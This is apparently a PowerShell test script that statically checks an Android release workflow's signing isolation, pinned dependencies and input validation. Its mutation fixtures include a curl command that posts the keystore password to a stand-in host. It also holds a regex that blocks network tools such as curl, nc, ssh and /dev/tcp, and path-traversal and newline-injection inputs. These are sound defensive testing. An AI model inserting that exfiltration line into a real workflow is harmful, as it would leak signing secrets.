param()

$ErrorActionPreference = "Stop"

$root = (Resolve-Path (Join-Path $PSScriptRoot "..")).Path
$workflowPath = Join-Path $root ".github\workflows\android-release.yml"
$readinessPath = Join-Path $root "scripts\check-android-release-readiness.ps1"
$configuratorPath = Join-Path $root "scripts\configure-android-release-signing.ps1"
$collectorPath = Join-Path $root "scripts\collect-android-save-validation.ps1"
$affectedDevicePreflightPath = Join-Path $root "scripts\check-stage5-affected-device.ps1"
$affectedDevicePreflightTestPath = Join-Path $root "scripts\test-stage5-affected-device-preflight.ps1"
$matrixReviewerPath = Join-Path $root "scripts\review-stage5-physical-matrix.ps1"
$matrixTemplatePath = Join-Path $root "scripts\new-stage5-physical-matrix-template.ps1"
$governanceWorkflowPath = Join-Path $root ".github\workflows\overhaul-governance-ci.yml"
$gradleWrapperPropertiesPath = Join-Path $root "android\gradle\wrapper\gradle-wrapper.properties"
$gradleWrapperJarPath = Join-Path $root "android\gradle\wrapper\gradle-wrapper.jar"
$gradleVerificationMetadataPath = Join-Path $root "android\gradle\verification-metadata.xml"
$godotSetupPath = Join-Path $root "scripts\setup-godot-source.sh"
$godotSetupPowerShellPath = Join-Path $root "scripts\setup-godot-source.ps1"
$godotRequirementsPath = Join-Path $root "scripts\requirements-godot-build.txt"
$signingUtilsPath = Join-Path $root "scripts\android-signing-utils.ps1"
$updateCompatibilityPath = Join-Path $root "scripts\verify-android-update-compat.ps1"
$nugetLockPaths = @(
    (Join-Path $root "src\STS2Mobile\packages.lock.json"),
    (Join-Path $root "tools\SteamKitAndroidPatch\packages.lock.json"),
    (Join-Path $root "tools\LocalGameplaySaveSafetyProbe\packages.lock.json")
)

if (-not (Test-Path -LiteralPath $workflowPath -PathType Leaf)) {
    throw "Android release-candidate workflow is missing: $workflowPath"
}
if (-not (Test-Path -LiteralPath $readinessPath -PathType Leaf)) {
    throw "Android release-readiness check is missing: $readinessPath"
}
if (-not (Test-Path -LiteralPath $configuratorPath -PathType Leaf)) {
    throw "Android release-signing configurator is missing: $configuratorPath"
}
if (-not (Test-Path -LiteralPath $collectorPath -PathType Leaf)) {
    throw "Android Stage 5 evidence collector is missing: $collectorPath"
}
if (-not (Test-Path -LiteralPath $matrixReviewerPath -PathType Leaf)) {
    throw "Android Stage 5 physical matrix reviewer is missing: $matrixReviewerPath"
}
if (-not (Test-Path -LiteralPath $matrixTemplatePath -PathType Leaf)) {
    throw "Android Stage 5 physical matrix template is missing: $matrixTemplatePath"
}
foreach ($requiredPath in @(
    $governanceWorkflowPath,
    $gradleWrapperPropertiesPath,
    $gradleWrapperJarPath,
    $gradleVerificationMetadataPath,
    $godotSetupPath,
    $godotSetupPowerShellPath,
    $godotRequirementsPath,
    $signingUtilsPath,
    $updateCompatibilityPath,
    $affectedDevicePreflightPath,
    $affectedDevicePreflightTestPath
) + $nugetLockPaths) {
    if (-not (Test-Path -LiteralPath $requiredPath -PathType Leaf)) {
        throw "Android candidate supply-chain input is missing: $requiredPath"
    }
}

$workflow = Get-Content -LiteralPath $workflowPath -Raw
$readiness = Get-Content -LiteralPath $readinessPath -Raw
$configurator = Get-Content -LiteralPath $configuratorPath -Raw
$matrixReviewer = Get-Content -LiteralPath $matrixReviewerPath -Raw
$matrixTemplate = Get-Content -LiteralPath $matrixTemplatePath -Raw
$governanceWorkflow = Get-Content -LiteralPath $governanceWorkflowPath -Raw
$gradleWrapperProperties = Get-Content -LiteralPath $gradleWrapperPropertiesPath -Raw
$gradleVerificationMetadata = Get-Content -LiteralPath $gradleVerificationMetadataPath -Raw
$godotSetup = Get-Content -LiteralPath $godotSetupPath -Raw
$godotSetupPowerShell = Get-Content -LiteralPath $godotSetupPowerShellPath -Raw
$godotRequirements = Get-Content -LiteralPath $godotRequirementsPath -Raw
$signingUtils = Get-Content -LiteralPath $signingUtilsPath -Raw
$updateCompatibility = Get-Content -LiteralPath $updateCompatibilityPath -Raw

$unsignedJobMarker = "  build-android-unsigned:"
$signingJobMarker = "  sign-android-candidate:"
$unsignedJobStart = $workflow.IndexOf($unsignedJobMarker, [StringComparison]::Ordinal)
$signingJobStart = $workflow.IndexOf($signingJobMarker, [StringComparison]::Ordinal)
if ($unsignedJobStart -lt 0 -or $signingJobStart -le $unsignedJobStart) {
    throw 'Stage 5 workflow must build unsigned bytes before a separate signing job.'
}
$unsignedJob = $workflow.Substring($unsignedJobStart, $signingJobStart - $unsignedJobStart)
$signingJob = $workflow.Substring($signingJobStart)
if ($unsignedJob -match '(?i)secrets\.|KEYSTORE_PASSWORD|KEYSTORE_ALIAS|KEYSTORE_BASE64') {
    throw 'Stage 5 unsigned Gradle job must not receive signing secrets.'
}
if ($signingJob -match '(?i)actions/setup-dotnet|\bdotnet(?:\.exe)?\b') {
    throw 'Stage 5 isolated signing runner must not install or execute .NET tooling.'
}
foreach ($secretName in @(
    'ANDROID_LOCAL_UPDATE_KEYSTORE_BASE64',
    'ANDROID_LOCAL_UPDATE_KEYSTORE_PASSWORD',
    'ANDROID_LOCAL_UPDATE_KEY_ALIAS'
)) {
    $secretPattern = 'secrets\.' + [Regex]::Escape($secretName)
    if ([Regex]::Matches($workflow, $secretPattern).Count -ne 1 -or $signingJob -notmatch $secretPattern) {
        throw "Stage 5 signing secret $secretName must be referenced exactly once, only by the isolated signing job."
    }
}

$allowedReleaseActions = @(
    'actions/checkout@11d5960a326750d5838078e36cf38b85af677262',
    'actions/setup-java@cf277c60eb25467037889841efdb72551f06f6c3',
    'actions/setup-python@e797f83bcb11b83ae66e0230d6156d7c80228e7c',
    'actions/setup-dotnet@67a3573c9a986a3f9c594539f4ab511d57bb3ce9',
    'actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02',
    'actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093'
)
foreach ($workflowActionMatch in [Regex]::Matches($workflow, '(?m)^\s*uses:\s*([^\s#]+)')) {
    $workflowAction = $workflowActionMatch.Groups[1].Value
    if ($allowedReleaseActions -notcontains $workflowAction) {
        throw "Stage 5 release workflow action is not an allowed exact official commit: $workflowAction"
    }
}
$releaseCheckoutCount = [Regex]::Matches($workflow, 'actions/checkout@').Count
$releaseNonPersistentCheckoutCount = [Regex]::Matches(
    $workflow,
    '(?m)uses:\s*actions/checkout@[A-Fa-f0-9]{40}\s+#[^\r\n]*\r?\n\s+with:\s*\r?\n\s+persist-credentials:\s*false'
).Count
if ($releaseCheckoutCount -ne $releaseNonPersistentCheckoutCount) {
    throw 'Stage 5 release workflow must disable persisted checkout credentials on every job.'
}

$safeReleaseMetadata = [Regex]::new('\A[A-Za-z0-9][A-Za-z0-9._-]{0,79}\z')
foreach ($validMetadata in @('v0.2.416-startup-recovery-ime', 'nightly-abcdef0', '0.2.417_local')) {
    if (-not $safeReleaseMetadata.IsMatch($validMetadata)) {
        throw "Stage 5 safe release-metadata rule rejected a valid fixture: $validMetadata"
    }
}
foreach ($invalidMetadata in @(
    '', '-leading-dash', '.leading-dot', 'path/name', 'glob*name', 'contains space',
    "line`nbreak", ('a' * 81)
)) {
    if ($safeReleaseMetadata.IsMatch($invalidMetadata)) {
        throw 'Stage 5 safe release-metadata rule accepted an unsafe fixture.'
    }
}

$safeUpstreamTag = [Regex]::new('\A[A-Za-z0-9][A-Za-z0-9._-]{0,63}\z')
if (-not $safeUpstreamTag.IsMatch('0.2.0') -or
    $safeUpstreamTag.IsMatch('../release') -or
    $safeUpstreamTag.IsMatch(('a' * 65))) {
    throw 'Stage 5 upstream-tag negative fixtures did not fail closed.'
}
$safeVersionCode = [Regex]::new('\A[1-9][0-9]{0,9}\z')
foreach ($invalidVersionCode in @('0', '01', '-1', '+1', '2100000001', ('9' * 11), "417003`nnext")) {
    $withinAndroidRange = $safeVersionCode.IsMatch($invalidVersionCode) -and
        [int64]$invalidVersionCode -le 2100000000
    if ($withinAndroidRange) {
        throw 'Stage 5 version-code rule accepted an unsafe fixture.'
    }
}

$safeHttpsSource = [Regex]::new('\Ahttps://[A-Za-z0-9][A-Za-z0-9.:-]{0,252}(/[A-Za-z0-9._~:/?#@!$%&()+,;=-]*)?\z')
$safeRepositorySource = [Regex]::new('\A[A-Za-z0-9][A-Za-z0-9._/-]{0,511}\z')
function Test-SafeSourceSyntax {
    param([AllowEmptyString()][string]$Value)

    if ([string]::IsNullOrEmpty($Value) -or $Value.Length -gt 512) {
        return $false
    }
    if ($safeHttpsSource.IsMatch($Value)) {
        return $true
    }
    if (-not $safeRepositorySource.IsMatch($Value)) {
        return $false
    }
    foreach ($part in $Value.Split('/')) {
        if ([string]::IsNullOrEmpty($part) -or $part -eq '.' -or $part -eq '..') {
            return $false
        }
    }
    return $true
}
foreach ($validSource in @(
    'https://github.com/example/project/releases/download/v1/source.apk',
    'upstream/godot-export/sts2.dll'
)) {
    if (-not (Test-SafeSourceSyntax $validSource)) {
        throw "Stage 5 source-input rule rejected a valid fixture: $validSource"
    }
}
foreach ($invalidSource in @(
    'http://example.com/source.apk', '../secret', '/absolute/path', '-curl-option',
    'path/*', 'path//file', 'path/../file', 'C:\secret', "https://example.com/file`n::error::x",
    ('a' * 513)
)) {
    if (Test-SafeSourceSyntax $invalidSource) {
        throw 'Stage 5 source-input rule accepted an unsafe fixture.'
    }
}

function Require-Pattern {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Description,

        [Parameter(Mandatory = $true)]
        [string]$Pattern
    )

    if ($workflow -notmatch $Pattern) {
        throw "Stage 5 release gate is missing: $Description"
    }
}

function Reject-Pattern {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Description,

        [Parameter(Mandatory = $true)]
        [string]$Pattern
    )

    if ($workflow -match $Pattern) {
        throw "Stage 5 release gate was bypassed: $Description"
    }
}

function Require-ReadinessPattern {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Description,

        [Parameter(Mandatory = $true)]
        [string]$Pattern
    )

    if ($readiness -notmatch $Pattern) {
        throw "Stage 5 release readiness is missing: $Description"
    }
}

function Reject-ReadinessPattern {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Description,

        [Parameter(Mandatory = $true)]
        [string]$Pattern
    )

    if ($readiness -match $Pattern) {
        throw "Stage 5 release readiness was bypassed: $Description"
    }
}

function Require-ConfiguratorPattern {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Description,

        [Parameter(Mandatory = $true)]
        [string]$Pattern
    )

    if ($configurator -notmatch $Pattern) {
        throw "Stage 5 signing configurator is missing: $Description"
    }
}

function Reject-ConfiguratorPattern {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Description,

        [Parameter(Mandatory = $true)]
        [string]$Pattern
    )

    if ($configurator -match $Pattern) {
        throw "Stage 5 signing configurator targets the wrong lineage: $Description"
    }
}

function Require-StaticPattern {
    param(
        [Parameter(Mandatory = $true)][string]$Content,
        [Parameter(Mandatory = $true)][string]$Subject,
        [Parameter(Mandatory = $true)][string]$Description,
        [Parameter(Mandatory = $true)][string]$Pattern
    )

    if ($Content -notmatch $Pattern) {
        throw "Stage 5 $Subject is missing: $Description"
    }
}

function Assert-ProtectedSigningBoundary {
    param([Parameter(Mandatory = $true)][string]$CandidateWorkflow)

    if ($CandidateWorkflow -notmatch '(?ms)Guard protected release ref.*?GITHUB_REF.*?refs/heads/main.*?exit 1.*?Setup Java') {
        throw 'Candidate workflow lacks an early fail-closed main-ref guard.'
    }
    if ($CandidateWorkflow -notmatch "(?ms)^  sign-android-candidate:.*?if:\s*github\.ref == 'refs/heads/main'.*?environment:\s*\r?\n\s+name:\s*android-local-signing") {
        throw 'Candidate signing job lacks its exact main/environment protection boundary.'
    }

    $secretStep = [Regex]::Match(
        $CandidateWorkflow,
        '(?ms)^\s{6}- name: Sign exact v0\.2\.416 local-line candidate.*?(?=^\s{6}- name:|\z)'
    )
    if (-not $secretStep.Success) {
        throw 'Candidate signing step could not be isolated for outbound-command review.'
    }
    if ($secretStep.Value -match '(?im)^\s*(curl|wget|nc|ncat|ssh|scp|sftp|ftp|gh|git)\b|/dev/(tcp|udp)') {
        throw 'Candidate signing step contains an outbound command while signing secrets are present.'
    }
}

function Assert-PinnedCandidateInputs {
    param([Parameter(Mandatory = $true)][string]$CandidateWorkflow)

    foreach ($requiredLiteral in @(
        'dotnet-version: "9.0.316"',
        'runtime_version="9.0.18"',
        '91a7efd0b3813e06295fb60753744aed79b0567f70b8f7c766e7f0dfd69e15e7',
        '81f74411bcb9286c5f6b7f11d05b80364ef5738555fda7a3b45215c9f18e12ee',
        'dotnet restore --locked-mode',
        'dotnet publish -c Release --no-restore'
    )) {
        if (-not $CandidateWorkflow.Contains($requiredLiteral)) {
            throw "Candidate workflow lacks pinned input: $requiredLiteral"
        }
    }
}

function Assert-ConfiguratorEnvironmentBoundary {
    param([Parameter(Mandatory = $true)][string]$CandidateConfigurator)

    if ($CandidateConfigurator -notmatch '(?s)\$signingEnvironment\s*=\s*"android-local-signing".*?\$requiredReleaseBranch\s*=\s*"main".*?deployment_branch_policy.*?custom_branch_policies.*?deployment-branch-policies\?per_page=100.*?total_count\s+-ne\s+1.*?name\s+-cne\s+\$requiredReleaseBranch.*?type\s+-cne\s+"branch"') {
        throw 'Signing configurator lacks its exact main-only environment preflight.'
    }
    $environmentScopedWrites = [Regex]::Matches(
        $CandidateConfigurator,
        "(?m)-Arguments\s+@\([^\r\n]*'--env',\s*\`$signingEnvironment"
    ).Count
    if ($environmentScopedWrites -ne 4) {
        throw 'Signing configurator must scope exactly three secrets and one signer variable to the protected environment.'
    }
    $preflightIndex = $CandidateConfigurator.IndexOf(
        '$branchPolicyMetadata = Get-GitHubApiJson',
        [StringComparison]::Ordinal
    )
    $firstWriteIndex = $CandidateConfigurator.IndexOf(
        'Invoke-ProcessWithStandardInput',
        [StringComparison]::Ordinal
    )
    if ($preflightIndex -lt 0 -or $firstWriteIndex -le $preflightIndex) {
        throw 'Signing configurator can write before completing environment protection checks.'
    }
}

function Assert-ReadinessEnvironmentBoundary {
    param([Parameter(Mandatory = $true)][string]$CandidateReadiness)

    if ($CandidateReadiness -notmatch '(?s)function Invoke-GitHubRead.*?ErrorActionPreference\s*=\s*"Continue".*?\$exitCode\s*=\s*\$LASTEXITCODE.*?finally.*?\$ErrorActionPreference\s*=\s*\$previousErrorActionPreference') {
        throw 'Release readiness cannot capture failed GitHub reads reliably.'
    }
    if ($CandidateReadiness -notmatch '(?s)\$SigningEnvironment\s*=\s*"android-local-signing".*?\$RequiredReleaseBranch\s*=\s*"main".*?environments/\$SigningEnvironment') {
        throw 'Release readiness lacks its fixed signing environment and branch.'
    }
    if ($CandidateReadiness -notmatch '(?s)\$deploymentPolicy.*?protected_branches.*?custom_branch_policies.*?deployment-branch-policies\?per_page=100') {
        throw 'Release readiness does not require a custom deployment branch policy.'
    }
    if ($CandidateReadiness -notmatch '(?s)\$branchPolicyMetadata\.total_count\s+-ne\s+1.*?\$branchPolicies\.Count\s+-ne\s+1.*?name\s+-cne\s+\$RequiredReleaseBranch.*?type\s+-cne\s+"branch"') {
        throw 'Release readiness does not require exactly one main branch policy.'
    }

    $environmentScopedReads = [Regex]::Matches(
        $CandidateReadiness,
        "(?m)'(?:secret|variable)', 'list', '--env', \`$SigningEnvironment, '--repo', \`$Repo"
    ).Count
    if ($environmentScopedReads -ne 2 -or
        $CandidateReadiness -match "(?m)'(?:secret|variable)', 'list', '--repo'") {
        throw 'Release readiness does not scope both credential reads only to the protected environment.'
    }

    $policyIndex = $CandidateReadiness.IndexOf(
        '$branchPolicyMetadata =',
        [StringComparison]::Ordinal
    )
    $secretReadIndex = $CandidateReadiness.IndexOf(
        '$secretRead =',
        [StringComparison]::Ordinal
    )
    if ($policyIndex -lt 0 -or $secretReadIndex -le $policyIndex) {
        throw 'Release readiness can read credential metadata before protection checks finish.'
    }
}

Assert-ProtectedSigningBoundary -CandidateWorkflow $workflow
Assert-PinnedCandidateInputs -CandidateWorkflow $workflow
Assert-ConfiguratorEnvironmentBoundary -CandidateConfigurator $configurator
Assert-ReadinessEnvironmentBoundary -CandidateReadiness $readiness

$boundaryMutations = @(
    ($workflow -replace '(?m)^\s+name:\s*android-local-signing\s*$', '      name: unprotected-signing'),
    ($workflow.Replace(
        '          unset APKSIGNER_OUTPUT',
        "          curl https://example.invalid/ --data-binary `"`$KEYSTORE_PASSWORD`"`n          unset APKSIGNER_OUTPUT"
    ))
)
foreach ($mutation in $boundaryMutations) {
    $rejected = $false
    try {
        Assert-ProtectedSigningBoundary -CandidateWorkflow $mutation
    } catch {
        $rejected = $true
    }
    if (-not $rejected) {
        throw 'Stage 5 release gate accepted a signing-boundary or secret-exfiltration mutation.'
    }
}

foreach ($mutation in @(
    $workflow.Replace('dotnet-version: "9.0.316"', 'dotnet-version: "9.0.x"'),
    $workflow.Replace(
        '81f74411bcb9286c5f6b7f11d05b80364ef5738555fda7a3b45215c9f18e12ee',
        ('0' * 64)
    )
)) {
    $rejected = $false
    try {
        Assert-PinnedCandidateInputs -CandidateWorkflow $mutation
    } catch {
        $rejected = $true
    }
    if (-not $rejected) {
        throw 'Stage 5 release gate accepted a floating SDK or altered package-hash mutation.'
    }
}

foreach ($mutation in @(
    $configurator.Replace('custom_branch_policies', 'all_branch_policies'),
    $configurator.Replace('$requiredReleaseBranch = "main"', '$requiredReleaseBranch = "*"'),
    $configurator.Replace(", '--env', `$signingEnvironment", '')
)) {
    $rejected = $false
    try {
        Assert-ConfiguratorEnvironmentBoundary -CandidateConfigurator $mutation
    } catch {
        $rejected = $true
    }
    if (-not $rejected) {
        throw 'Stage 5 release gate accepted a weakened signing-environment configurator.'
    }
}

foreach ($mutation in @(
    $readiness.Replace('custom_branch_policies', 'all_branch_policies'),
    $readiness.Replace('$RequiredReleaseBranch = "main"', '$RequiredReleaseBranch = "*"'),
    $readiness.Replace("'secret', 'list', '--env', `$SigningEnvironment, '--repo', `$Repo", "'secret', 'list', '--repo', `$Repo"),
    $readiness.Replace("'variable', 'list', '--env', `$SigningEnvironment, '--repo', `$Repo", "'variable', 'list', '--repo', `$Repo")
)) {
    $rejected = $false
    try {
        Assert-ReadinessEnvironmentBoundary -CandidateReadiness $mutation
    } catch {
        $rejected = $true
    }
    if (-not $rejected) {
        throw 'Stage 5 release gate accepted a weakened readiness environment boundary.'
    }
}

Require-Pattern `
    -Description "candidate-only workflow identity" `
    -Pattern '(?m)^name:\s*Android Release Candidate\s*$'
Require-Pattern `
    -Description "candidate source commit binding" `
    -Pattern 'source_commit=\$\{GITHUB_SHA\}'
Require-Pattern `
    -Description "candidate workflow-run binding" `
    -Pattern 'candidate_run_id=\$\{GITHUB_RUN_ID\}'
Require-Pattern `
    -Description "candidate workflow-run attempt binding" `
    -Pattern 'candidate_run_attempt=\$\{GITHUB_RUN_ATTEMPT\}'
Require-Pattern `
    -Description "candidate ABI binding" `
    -Pattern 'echo "abi=arm64-v8a"'
Require-Pattern `
    -Description "candidate APK byte binding" `
    -Pattern 'apk_sha256=\$\{APK_SHA\}'
Require-Pattern `
    -Description "candidate actual signer binding" `
    -Pattern 'signer_sha256=\$\{ACTUAL_SIGNER_SHA256\}'
Require-Pattern `
    -Description "actual candidate signer verification" `
    -Pattern 'ACTUAL_SIGNER_SHA256" != "\$EXPECTED_SIGNER_NORMALIZED'
Require-Pattern `
    -Description "fixed published .local package" `
    -Pattern 'PACKAGE_NAME="com\.sts2launcher\.overhaul\.fork\.local"'
Require-Pattern `
    -Description "default versionCode newer than the pinned v0.2.416 baseline" `
    -Pattern '(?ms)version_code:\s*.*?required:\s*true\s*.*?default:\s*"417003"'
Require-Pattern `
    -Description "early pinned-baseline versionCode rejection" `
    -Pattern '10#\$VERSION_CODE <= 416001'
Require-Pattern `
    -Description "fixed v0.2.416 update-baseline tag" `
    -Pattern 'UPDATE_BASELINE_TAG:\s*v0\.2\.416-startup-recovery-ime'
Require-Pattern `
    -Description "fixed v0.2.416 update-baseline asset" `
    -Pattern 'UPDATE_BASELINE_ASSET_NAME:\s*StS2Launcher-v0\.2\.416-startup-recovery-ime-local-arm64-v8a\.apk'
Require-Pattern `
    -Description "fixed v0.2.416 update-baseline bytes" `
    -Pattern 'UPDATE_BASELINE_APK_SHA256:\s*fdf2dcfcf2352d0e1a370da76922fb5b70cee3654d98c5fe9afbbd39554fc17b'
Require-Pattern `
    -Description "dedicated local-update keystore secret" `
    -Pattern 'secrets\.ANDROID_LOCAL_UPDATE_KEYSTORE_BASE64'
Require-Pattern `
    -Description "dedicated local-update password and alias secrets" `
    -Pattern '(?s)secrets\.ANDROID_LOCAL_UPDATE_KEYSTORE_PASSWORD.*?secrets\.ANDROID_LOCAL_UPDATE_KEY_ALIAS'
Require-Pattern `
    -Description "dedicated local-update signer variable" `
    -Pattern 'vars\.ANDROID_LOCAL_UPDATE_SIGNER_SHA256'
Require-Pattern `
    -Description "quoted workflow-dispatch metadata input environment" `
    -Pattern '(?ms)RELEASE_TAG_INPUT:\s*"\$\{\{\s*github\.event\.inputs\.release_tag\s*\}\}".*?VERSION_NAME_INPUT:\s*"\$\{\{\s*github\.event\.inputs\.version_name\s*\}\}".*?VERSION_CODE_INPUT:\s*"\$\{\{\s*github\.event\.inputs\.version_code\s*\}\}".*?RELEASE_TAG="\$\{RELEASE_TAG_INPUT\}".*?VERSION_NAME="\$\{VERSION_NAME_INPUT\}".*?VERSION_CODE="\$\{VERSION_CODE_INPUT\}"'
Require-Pattern `
    -Description "conservative release tag and version name validation before outputs" `
    -Pattern '(?ms)SAFE_RELEASE_METADATA_PATTERN=''\^\[A-Za-z0-9\]\[A-Za-z0-9\._-\]\{0,79\}\$''.*?RELEASE_TAG.*?SAFE_RELEASE_METADATA_PATTERN.*?VERSION_NAME.*?SAFE_RELEASE_METADATA_PATTERN.*?echo "package_name=\$PACKAGE_NAME" >> "\$GITHUB_OUTPUT"'
Require-Pattern `
    -Description "canonical bounded Android version code validation" `
    -Pattern '\^\[1-9\]\[0-9\]\{0,9\}\$.*?10#\$VERSION_CODE > 2100000000'
Require-Pattern `
    -Description "quoted workflow-dispatch dependency input environment" `
    -Pattern '(?ms)UPSTREAM_TAG_INPUT:\s*"\$\{\{\s*github\.event\.inputs\.upstream_release_tag\s*\}\}".*?UPSTREAM_APK_SHA256_INPUT:\s*"\$\{\{\s*github\.event\.inputs\.upstream_release_apk_sha256\s*\}\}".*?STS2_SOURCE_INPUT:\s*"\$\{\{\s*github\.event\.inputs\.sts2_dll_source_url\s*\}\}".*?STS2_SOURCE_SHA256_INPUT:\s*"\$\{\{\s*github\.event\.inputs\.sts2_dll_source_sha256\s*\}\}".*?UPSTREAM_TAG="\$\{UPSTREAM_TAG_INPUT\}".*?UPSTREAM_APK_SHA256="\$\{UPSTREAM_APK_SHA256_INPUT\}".*?STS2_SOURCE="\$\{STS2_SOURCE_INPUT\}".*?STS2_SOURCE_SHA256="\$\{STS2_SOURCE_SHA256_INPUT\}"'
Require-Pattern `
    -Description "conservative upstream tag validation before URL and path construction" `
    -Pattern '(?ms)SAFE_UPSTREAM_TAG_PATTERN=''\^\[A-Za-z0-9\]\[A-Za-z0-9\._-\]\{0,63\}\$''.*?UPSTREAM_TAG.*?SAFE_UPSTREAM_TAG_PATTERN.*?UPSTREAM_APK="StS2Launcher-v\$\{UPSTREAM_TAG\}\.apk"'
Require-Pattern `
    -Description "safe pinned source URL or repository path boundary" `
    -Pattern '(?ms)SAFE_HTTPS_SOURCE_PATTERN=''\^https://.*?SAFE_REPOSITORY_SOURCE_PATTERN=''\^\[A-Za-z0-9\].*?SOURCE_PATH_PARTS.*?realpath "\$STS2_SOURCE".*?RESOLVED_WORKSPACE.*?cp --'
Require-Pattern `
    -Description "curl option termination for constructed and supplied URLs" `
    -Pattern '(?ms)curl -fsSL -o "\$TMP_APK" -- "\$UPSTREAM_URL".*?curl -fsSL -o "\$STS2_SOURCE_FILE" -- "\$STS2_SOURCE"'
Require-Pattern `
    -Description "separate secret-free build and isolated signing jobs" `
    -Pattern '(?ms)^  build-android-unsigned:.*?^  sign-android-candidate:\s*\r?\n\s+name:.*?\r?\n\s+needs:\s*build-android-unsigned\s*$'
Require-Pattern `
    -Description "Gradle produces an aligned unsigned APK without signing secrets" `
    -Pattern '(?ms)Build unsigned release APK.*?"-Pperform_signing=false".*?"-Pperform_zipalign=true".*?\./gradlew --no-daemon'
Require-Pattern `
    -Description "downloaded unsigned bytes are bound to the secret-free build output" `
    -Pattern '(?ms)unsigned_sha256:.*?steps\.build_unsigned\.outputs\.sha256.*?EXPECTED_UNSIGNED_SHA256:.*?needs\.build-android-unsigned\.outputs\.unsigned_sha256.*?ACTUAL_UNSIGNED_SHA256.*?EXPECTED_UNSIGNED_SHA256'
Require-Pattern `
    -Description "unsigned identity and signature state are checked before key exposure" `
    -Pattern '(?ms)Verify unsigned APK before signing.*?apksigner.*?verify.*?already signed.*?aapt.*?dump badging.*?Unsigned APK identity does not match.*?Sign exact v0\.2\.416 local-line candidate'
Require-Pattern `
    -Description "all signing secrets checked once inside the isolated signing step" `
    -Pattern '(?ms)Sign exact v0\.2\.416 local-line candidate.*?KEYSTORE_BASE64:\s*"\$\{\{\s*secrets\.ANDROID_LOCAL_UPDATE_KEYSTORE_BASE64\s*\}\}".*?KEYSTORE_PASSWORD:\s*"\$\{\{\s*secrets\.ANDROID_LOCAL_UPDATE_KEYSTORE_PASSWORD\s*\}\}".*?KEYSTORE_ALIAS:\s*"\$\{\{\s*secrets\.ANDROID_LOCAL_UPDATE_KEY_ALIAS\s*\}\}".*?if \[\[ -z "\$\{KEYSTORE_BASE64\}".*?-z "\$\{KEYSTORE_PASSWORD\}".*?-z "\$\{KEYSTORE_ALIAS\}" \]\]'
Require-Pattern `
    -Description "isolated apksigner reads key passwords from its environment" `
    -Pattern '(?ms)Sign exact v0\.2\.416 local-line candidate.*?apksigner.*?sign.*?--ks-pass env:KEYSTORE_PASSWORD.*?--key-pass env:KEYSTORE_PASSWORD'
Require-Pattern `
    -Description "encoded key and credentials have minimal child-process lifetime" `
    -Pattern '(?ms)Sign exact v0\.2\.416 local-line candidate.*?unset KEYSTORE_BASE64.*?env -u KEYSTORE_PASSWORD -u KEYSTORE_ALIAS base64 --decode.*?APKSIGNER_OUTPUT="\$\(.*?sign.*?2>&1\)" \|\| SIGN_EXIT_CODE=\$\?.*?unset KEYSTORE_PASSWORD KEYSTORE_ALIAS.*?unset APKSIGNER_OUTPUT'
Require-Pattern `
    -Description "scoped signing-key cleanup completes before post-sign verification and upload" `
    -Pattern '(?ms)Sign exact v0\.2\.416 local-line candidate.*?rm -f -- "\$KEYSTORE_PATH".*?trap cleanup_signing EXIT.*?Verify signed candidate and write metadata.*?Upload APK artifact'
Require-Pattern `
    -Description "fixed Android build-tools for signed identity and update verification" `
    -Pattern '(?ms)Verify signed candidate and write metadata.*?build-tools/35\.0\.0.*?Get-AndroidApkIdentity.*?-Aapt \$env:AAPT_TO_USE -ApkSigner \$env:APKSIGNER_TO_USE.*?verify-android-update-compat\.ps1.*?-Aapt "\$AAPT".*?-ApkSigner "\$APKSIGNER"'
Require-Pattern `
    -Description "checked-in non-daemon Gradle wrapper" `
    -Pattern '\./gradlew --no-daemon "\$\{GRADLE_ARGS\[@\]\}"'
Require-Pattern `
    -Description "pinned upstream 0.2.0 APK bytes" `
    -Pattern '6dddbd6716c3830ec802e2672be2402bd06d4270dcf1bcd72c27e46ca05acf41'
Require-Pattern `
    -Description "pinned v0.2.416 sts2 source APK bytes" `
    -Pattern 'fdf2dcfcf2352d0e1a370da76922fb5b70cee3654d98c5fe9afbbd39554fc17b'
Require-Pattern `
    -Description "explicit v0.2.416 sts2 source APK" `
    -Pattern 'releases/download/v0\.2\.416-startup-recovery-ime/StS2Launcher-v0\.2\.416-startup-recovery-ime-local-arm64-v8a\.apk'
Require-Pattern `
    -Description "downloaded upstream APK hash verification" `
    -Pattern 'ACTUAL_UPSTREAM_APK_SHA256.*UPSTREAM_APK_SHA256'
Require-Pattern `
    -Description "downloaded sts2 source hash verification" `
    -Pattern 'ACTUAL_STS2_SOURCE_SHA256.*STS2_SOURCE_SHA256'
Require-Pattern `
    -Description "downloaded update-baseline hash verification" `
    -Pattern 'ACTUAL_BASELINE_APK_SHA256.*UPDATE_BASELINE_APK_SHA256'
Require-Pattern `
    -Description "retained candidate APK artifact" `
    -Pattern 'actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02\s+#\s+v4\.6\.2'
Require-Pattern `
    -Description "immutable artifact download action" `
    -Pattern 'actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093\s+#\s+v4\.3\.0'
Require-Pattern `
    -Description "immutable checkout action" `
    -Pattern 'actions/checkout@11d5960a326750d5838078e36cf38b85af677262\s+#\s+v4\.4\.0'
Require-Pattern `
    -Description "immutable Java setup action" `
    -Pattern 'actions/setup-java@cf277c60eb25467037889841efdb72551f06f6c3\s+#\s+v4\.9\.1'
Require-Pattern `
    -Description "immutable Python setup action" `
    -Pattern 'actions/setup-python@e797f83bcb11b83ae66e0230d6156d7c80228e7c\s+#\s+v6\.0\.0'
Require-Pattern `
    -Description "immutable .NET setup action" `
    -Pattern 'actions/setup-dotnet@67a3573c9a986a3f9c594539f4ab511d57bb3ce9\s+#\s+v4\.3\.1'
Require-Pattern `
    -Description "exact candidate runner, Java, Python, and .NET versions" `
    -Pattern '(?ms)runs-on:\s*ubuntu-24\.04.*?java-version:\s*"17\.0\.20\+8".*?python-version:\s*"3\.12\.13".*?dotnet-version:\s*"9\.0\.316"'
Require-Pattern `
    -Description "protected main ref guard before candidate tooling" `
    -Pattern '(?ms)Guard protected release ref.*?GITHUB_REF.*?refs/heads/main.*?exit 1.*?Setup Java'
Require-Pattern `
    -Description "environment-protected signing job restricted to main" `
